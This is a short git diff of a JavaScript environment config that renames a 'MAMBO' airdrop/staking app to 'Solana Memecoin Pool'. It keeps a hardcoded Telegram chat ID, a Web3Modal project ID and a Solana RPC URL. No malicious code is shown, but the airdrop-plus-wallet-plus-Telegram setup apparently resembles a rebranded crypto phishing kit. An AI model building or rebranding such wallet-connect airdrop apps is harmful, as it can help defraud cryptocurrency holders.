@@ -1,4 +1,4 @@
-// Environment Configuration for MAMBO Airdrop Application
+// Environment Configuration for Solana Memecoin Pool Application
 // Set these variables in your Vercel project environment variables
 // For local development, create a .env.local file with these values
 
@@ -23,7 +23,7 @@ export const ENV_CONFIG = {
   TELEGRAM_CHAT_ID: process.env.TELEGRAM_CHAT_ID || '7900328128',
   
   // Project Configuration
-  PROJECT_NAME: process.env.PROJECT_NAME || 'MAMBO',
+  PROJECT_NAME: process.env.PROJECT_NAME || 'Solana Memecoin Pool',
   
   // Web3Modal Configuration
   WEB3MODAL_PROJECT_ID: process.env.WEB3MODAL_PROJECT_ID || '45a382364ff2b00404b2d4c2ff95dbd4',
@@ -88,6 +88,6 @@ export const WEB3MODAL_RPC_CONFIG = {
   public: process.env.RPC_URL || 'https://api.mainnet-beta.solana.com'
 };
 
-export const PROJECT_NAME = process.env.PROJECT_NAME || 'MAMBO Staking';
+export const PROJECT_NAME = process.env.PROJECT_NAME || 'Solana Memecoin Pool';
 
 export default ENV_CONFIG;
